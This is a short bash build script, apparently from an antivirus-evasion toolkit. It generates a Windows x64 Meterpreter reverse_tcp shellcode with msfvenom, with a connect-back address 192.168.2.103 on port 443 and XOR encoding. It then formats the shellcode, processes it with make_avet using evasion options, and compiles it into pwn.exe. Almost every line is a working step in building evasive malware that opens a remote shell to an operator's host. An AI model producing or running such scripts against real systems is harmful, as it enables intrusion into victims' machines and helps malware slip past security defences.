#!/bin/bash    
# example script for building executables with 64bit payload

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# configure your connect-back settings here
LHOST=192.168.2.103
LPORT=443

# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > sc.txt

# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt

# call make_avet, compile 
./make_avet -f scclean.txt -X -E
$win64_compiler -o pwn.exe avet.c

# cleanup
rm scclean.txt && echo "" > defs.h
